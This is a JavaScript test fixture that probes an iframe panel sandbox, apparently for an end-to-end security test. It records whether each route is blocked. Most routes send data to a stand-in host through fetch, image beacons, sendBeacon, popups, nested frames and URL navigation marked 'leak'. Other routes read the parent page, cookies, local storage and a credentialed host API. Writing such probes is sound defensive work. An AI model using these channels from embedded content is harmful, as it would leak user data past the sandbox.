// Tries every way out of the panel sandbox and records whether it was blocked.
// The e2e test reads #results and also watches the browser's real network traffic.
(async () => {
  const results = {};
  const host = (location.ancestorOrigins && location.ancestorOrigins[0]) || "http://127.0.0.1:47821";
  const settle = (p, ms = 2500) => Promise.race([p, new Promise((r) => setTimeout(() => r("timeout"), ms))]);

  async function attempt(name, fn) {
    try {
      const v = await fn();
      results[name] = { blocked: v === "blocked", detail: String(v) };
    } catch (e) {
      results[name] = { blocked: true, detail: `${e && e.name}: ${e && e.message}` };
    }
  }

  await attempt("fetch-external", async () => {
    await fetch("https://example.com/probe-fetch");
    return "reached";
  });
  await attempt("fetch-host-api", async () => {
    const r = await fetch(`${host}/api/status`, { credentials: "include" });
    return `reached ${r.status}`;
  });
  await attempt("websocket-host", () =>
    settle(
      new Promise((resolve) => {
        const ws = new WebSocket(`${host.replace(/^http/, "ws")}/api/events`);
        ws.onopen = () => resolve("reached");
        ws.onerror = () => resolve("blocked");
        ws.onclose = () => resolve("blocked");
      }),
    ).then((v) => (v === "timeout" ? "blocked" : v)),
  );
  await attempt("image-beacon", () =>
    settle(
      new Promise((resolve) => {
        const img = new Image();
        img.onload = () => resolve("reached");
        img.onerror = () => resolve("blocked");
        img.src = "https://example.com/probe-pixel.png?leak=1";
      }),
    ).then((v) => (v === "timeout" ? "blocked" : v)),
  );
  await attempt("send-beacon", () => (navigator.sendBeacon("https://example.com/probe-beacon", "leak") ? "queued" : "blocked"));
  await attempt("parent-dom", () => `reached ${window.parent.document.title}`);
  await attempt("cookie", () => `reached ${document.cookie}`);
  await attempt("local-storage", () => {
    localStorage.setItem("x", "1");
    return "reached";
  });
  await attempt("popup", () => (window.open("https://example.com/probe-popup") ? "reached" : "blocked"));
  await attempt("nested-frame", () =>
    settle(
      new Promise((resolve) => {
        const f = document.createElement("iframe");
        f.onload = () => {
          try {
            resolve(f.contentWindow.location.href === "about:blank" ? "blocked" : "reached");
          } catch {
            resolve("blocked");
          }
        };
        f.src = "https://example.com/probe-frame";
        document.body.append(f);
      }),
      1500,
    ).then((v) => (v === "timeout" ? "blocked" : v)),
  );
  // A blocked form navigation may replace the frame with an error document.
  // Run it on demand after the other probe results have been inspected.
  document.getElementById("submit-probe").addEventListener("click", () => {
    document.getElementById("f").submit();
  });

  document.getElementById("results").textContent = JSON.stringify(results);
  document.title = "probe-done";
  window.parent.postMessage({ jsonrpc: "2.0", method: "ui/notifications/initialized" }, "*");
  // Navigating this frame to an external URL (data in the URL) is tried on demand, so the
  // results above can be read first: the e2e test clicks #escape after reading #results.
  document.getElementById("escape").addEventListener("click", () => {
    location.href = "https://example.com/probe-navigate?leak=1";
  });
})();
